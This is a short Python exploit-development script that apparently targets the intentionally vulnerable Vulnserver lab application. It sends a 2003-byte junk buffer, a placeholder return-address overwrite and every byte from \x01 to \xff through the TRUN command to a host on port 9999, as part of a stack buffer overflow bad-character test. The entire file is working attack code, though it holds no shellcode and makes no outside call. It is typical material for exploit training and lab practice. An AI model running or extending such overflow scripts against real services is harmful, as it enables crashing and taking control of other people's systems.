#!/usr/bin/python3

import socket

ip = "192.168.0.101"
port = 9999

offset = 2003
junk = b"A" * offset
eip = b"B" * 4  # Temporary overwrite
padding = b"C" * 10

# Generate bad characters from \x01 to \xff
badchars = b""
for i in range(1, 256):
    badchars += bytes([i])

payload = junk + eip + padding + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b"TRUN /.:/" + payload)
    s.close()
    print(f"Payload sent. Length: {len(payload)} bytes")
except:
    print("Could not connect to the server")
